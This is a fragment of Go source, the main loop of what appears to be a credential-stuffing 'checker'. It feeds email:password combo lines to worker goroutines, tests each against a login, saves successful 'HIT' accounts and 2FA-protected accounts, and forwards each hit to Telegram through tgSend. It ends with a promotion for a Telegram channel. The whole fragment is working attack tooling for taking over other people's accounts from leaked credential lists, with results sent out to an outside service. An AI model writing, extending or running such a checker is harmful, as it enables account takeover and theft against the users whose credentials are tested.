	fmt.Printf("%s└%s┘%s\n\n", cCyn, strings.Repeat("─", 60), cRst)

	jobs := make(chan string, len(combos))
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()
		chk := NewChecker(keywords, debug, runMode)
		for line := range jobs {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) < 2 {
				continue
			}
			r := chk.Check(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
			stats.Update(r)
			switch r.Status {
			case "HIT":
				rm.SaveHit(r)
				printHit(r, printLock)
				tgSend(tgBuildHitMsg(r))
			case "2FA":
				rm.Save2FA(r.Email, r.Password)
				printLock.Lock()
				fmt.Printf("\n%s🔐 2FA: %s%s\n", cYel, r.Email, cRst)
				printLock.Unlock()
			}
			stats.Print()
		}
	}

	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go worker()
	}
	for _, c := range combos {
		jobs <- c
	}
	close(jobs)
	wg.Wait()

	stats.Print()
	printFinal(stats, rm)
	fmt.Printf("\n%s✨ Done!  t.me/DenxPortal%s\n", cMag, cRst)
}
